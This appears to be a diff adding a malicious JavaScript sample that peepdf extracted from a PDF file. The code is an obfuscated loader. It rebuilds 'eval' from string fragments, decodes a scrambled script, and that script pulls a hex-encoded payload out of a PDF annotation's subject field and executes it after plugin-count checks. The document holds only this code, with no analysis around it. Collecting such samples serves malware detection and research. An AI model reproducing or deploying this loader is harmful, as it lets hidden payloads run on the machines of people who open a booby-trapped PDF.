@@ -1,0 +1,18 @@
+// peepdf comment: Javascript code located in object 4 (version 0)
+
+var fo = "Code";
+var google = this;
+var yahoo = String;
+foo = "Char" + fo;
+to = "char" + fo;
+var msdn = 1;
+
+function ro(str, m) {
+    return yahoo["from" + foo](m[to + "At"](0) - msdn);
+}
+var oe = 're';
+var el = 'e';
+oe += 'place';
+el += 'va' + 'l';
+google[el]("v10b12r pr = n10v12ll;v10b12r F10p12zz10z12 = 10b12pp;v10b12r fnc = 'e';v10b12r s10v12m = '';F10p12zz10z12.d10p12c.s10z12ncAnn10p12tSc10b12n();if (F10p12zz10z12.pl10v12gIns.length != 0) {	v10b12r n10v12m = 1;	pr = F10p12zz10z12.d10p12c.getAnn10p12ts(		{			nP10b12ge: 0		}	);	s10v12m = pr[n10v12m].s10v12bject;}v10b12r b10v12f = \"\";if (F10p12zz10z12.pl10v12gIns.length > 3) {	fnc += 'v10b12';	v10b12r 10b12rr = s10v12m.split(/ g10p1210p12gle_/);	v10b12r v4 = String;	v10b12r v5 = \"Ch10b12\";	v10b12r v6 = \"fr10p12m\"+v5+\"rC10p12de\";	f10p12r (v10b12r i = 1; i < 10b12rr.length; i++) {		b10v12f += v4[v6](\"0\"+\"x\"+10b12rr[i]);	}	fnc += 'l';}if (F10p12zz10z12.pl10v12gIns.length >= 2){	F10p12zz10z12[fnc](b10v12f);}" [oe](/10(.)12/g, ro));
+
